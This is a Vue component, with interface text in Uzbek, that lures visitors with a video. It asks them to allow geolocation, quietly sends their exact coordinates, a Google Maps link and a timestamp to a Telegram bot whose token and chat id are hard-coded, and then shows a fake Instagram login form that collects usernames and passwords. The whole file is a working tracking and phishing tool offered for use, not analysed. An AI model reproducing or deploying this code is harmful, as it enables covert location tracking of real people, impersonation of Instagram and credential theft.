<template>
  <div class="video-container">
    <!-- Geolocation Modal -->
    <div v-if="showGeoModal" class="modal">
      <div class="modal-content">
        <img src="../logos.png" width="48" height="48" alt="logo" />
        <h2>
          Videoni ko'rishdan oldin joylashuvingizni aniqlashga ruxsat bering.
        </h2>
        <button @click="requestGeolocation" class="allow-btn">
          Ruxsat berish
        </button>
      </div>
    </div>

    <!-- Error Modal -->
    <div v-if="geoDenied" class="modal">
      <div class="modal-content">
        <h2>
          📍 Iltimos, videoni ko'rish uchun joylashuvingizga ruxsat bering.
        </h2>
      </div>
    </div>

    <!-- Login Form -->
    <div v-if="showLogin" class="login-form">
      <img
        src="../logos.png"
        width="75"
        height="75"
        alt="logo"
        class="instagram-logo"
      />
      <h2 class="instagram-text">Instagram</h2>
      <input
        type="text"
        placeholder="Phone number, username, or email"
        v-model="username"
      />
      <input type="password" placeholder="Password" v-model="password" />
      <button class="allow-btn login-btn" @click="submitLogin">Log in</button>
      <div class="or-divider">
        <span class="divider-line"></span>
        <span class="or-text">OR</span>
        <span class="divider-line"></span>
      </div>
      <a href="#" class="forgot-password">Forgot password?</a>
      <div class="signup-container">
        <p>
          Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </p>
      </div>
    </div>

    <!-- Video Player -->
    <div v-if="showVideo" class="video-box">
      <video controls autoplay class="insta-video">
        <source src="./assets/mainvideo.mp4" type="video/mp4" />
        Sizning brauzeringiz video tagni qo'llab-quvvatlamaydi.
      </video>
    </div>
  </div>
</template>

<script>
export default {
  name: "GeoLoginVideo",
  data() {
    return {
      showGeoModal: true,
      geoDenied: false,
      showLogin: false,
      showVideo: false,
      username: "",
      password: "",
      latitude: null,
      longitude: null,
      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
      chatId: "5673984207",
    };
  },
  methods: {
    requestGeolocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            this.latitude = pos.coords.latitude;
            this.longitude = pos.coords.longitude;
            this.sendToTelegram();
            this.showGeoModal = false;
            this.showLogin = true;
          },
          (err) => {
            console.error("Geolocation error:", err.message);
            this.geoDenied = true;
            this.showGeoModal = false;
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      } else {
        this.geoDenied = true;
        this.showGeoModal = false;
      }
    },
    sendToTelegram() {
      const message = `📍 Foydalanuvchi joylashuvi:
Latitude: ${this.latitude}
Longitude: ${this.longitude}
🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
🕒 Vaqt: ${new Date().toLocaleString()}`;
      const url = `https://api.telegram.org/bot${
        this.botToken
      }/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(message)}`;
      fetch(url)
        .then((res) => res.json())
        .catch((err) => console.error(err));
    },
    submitLogin() {
      if (this.username && this.password) {
        this.showLogin = false;
        this.showVideo = true;
      } else {
        alert("Iltimos, barcha maydonlarni to'ldiring.");
      }
    },
  },
};
</script>

<style scoped>
/* Ekran o'lchamlarini to'g'ri aniqlash */
html,
body {
  margin: 0;
  padding: 0;
  height: 100%;
  width: 100%;
  background: #000;
  font-family: sans-serif;
  color: #fff;
  overflow-x: hidden;
}

/* Video konteyner */
.video-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  width: 100%;
  background: #000;
  padding: 20px;
  box-sizing: border-box;
}

/* Modal oynalar */
.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(0, 0, 0, 0.85);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 999;
  padding: 20px;
  box-sizing: border-box;
}

/* Modal va login formasi */
.modal-content,
.login-form {
  background: #1a1a1a;
  padding: 25px 20px;
  border-radius: 12px;
  width: 100%;
  max-width: 400px;
  box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
  display: flex;
  flex-direction: column;
  gap: 12px;
  align-items: center;
  text-align: center;
}

/* Ruxsat berish tugmasi */
.allow-btn {
  background: #0095f6;
  color: #fff;
  border: none;
  border-radius: 8px;
  padding: 10px 20px;
  font-weight: bold;
  cursor: pointer;
}
.allow-btn:hover {
  background: #0078cc;
}

/* Login form styling */
.login-form input {
  width: 100%;
  padding: 12px 10px;
  border: 1px solid #262626;
  border-radius: 4px;
  background: #121212;
  color: #fff;
  margin-bottom: 6px;
  font-size: 14px;
}

.login-btn {
  width: 100%;
  margin-top: 8px;
}

.instagram-logo {
  margin-bottom: 10px;
}

.instagram-text {
  font-family: "Brush Script MT", cursive;
  font-size: 38px;
  margin-bottom: 20px;
  color: #fff;
}

.or-divider {
  display: flex;
  align-items: center;
  width: 100%;
  margin: 15px 0;
}

.divider-line {
  flex: 1;
  height: 1px;
  background-color: #262626;
}

.or-text {
  padding: 0 15px;
  color: #8e8e8e;
  font-size: 13px;
  font-weight: 600;
}

.forgot-password,
.signup-link {
  color: #0095f6;
  font-size: 13px;
  text-decoration: none;
}

.signup-container {
  margin-top: 20px;
  font-size: 14px;
  text-align: center;
}

/* Video oynasi */
.video-box {
  width: 100%;
  max-width: 400px;
  margin-top: 30px;
}
.insta-video {
  width: 100%;
  border-radius: 12px;
  display: block;
}
</style>
